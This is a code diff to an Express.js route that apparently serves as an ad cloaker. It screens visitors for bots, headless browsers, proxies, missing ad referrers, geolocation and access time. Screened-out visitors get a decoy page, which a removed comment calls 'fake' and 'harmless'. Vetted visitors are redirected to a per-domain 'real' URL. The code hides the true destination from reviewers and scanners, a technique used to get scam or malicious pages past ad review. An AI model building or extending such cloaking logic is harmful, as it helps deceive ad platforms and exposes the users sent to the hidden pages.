@@ -7,10 +7,16 @@ const {
   isHeadless,
   isAccessTimeValid
 } = require('../utils/securityChecks');
+const Domain = require('../models/Domain');
+
 
 // Página pública /:slug
 router.get('/:slug', async (req, res) => {
   try {
+    const { slug } = req.params;
+    const domain = await Domain.findOne({ slug });
+    if (!domain) return res.redirect('https://google.com'); // fallback se slug inválido
+
     const userAgent = req.headers['user-agent'] || '';
     const ref = req.get('referer') || '';
     const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
@@ -30,10 +36,10 @@ router.get('/:slug', async (req, res) => {
 
     // 🚫 Bloqueio
     const blocked = isBot || !fromAd || headless || proxy || !geoOk || !timeOk;
-
+    
     if (blocked && !trusted) {
       console.warn("🚫 Visitante bloqueado:", { ip, ua: userAgent, ref });
-      return res.render('fake'); // Página fake com conteúdo inofensivo
+       return res.redirect(domain.baseUrl);
     }
 
     // ✅ Se for humano válido → salvar/atualizar FP
@@ -45,10 +51,10 @@ router.get('/:slug', async (req, res) => {
       await exists.save();
     }
 
-    return res.render('real'); // Página real liberada
+   return res.redirect(domain.realUrl); // Página real liberada
   } catch (err) {
     console.error("❌ Erro em render.routes:", err.message);
-    return res.render('fake'); // fallback seguro
+    return res.redirect(domain?.baseUrl || 'https://google.com');
   }
 });
 
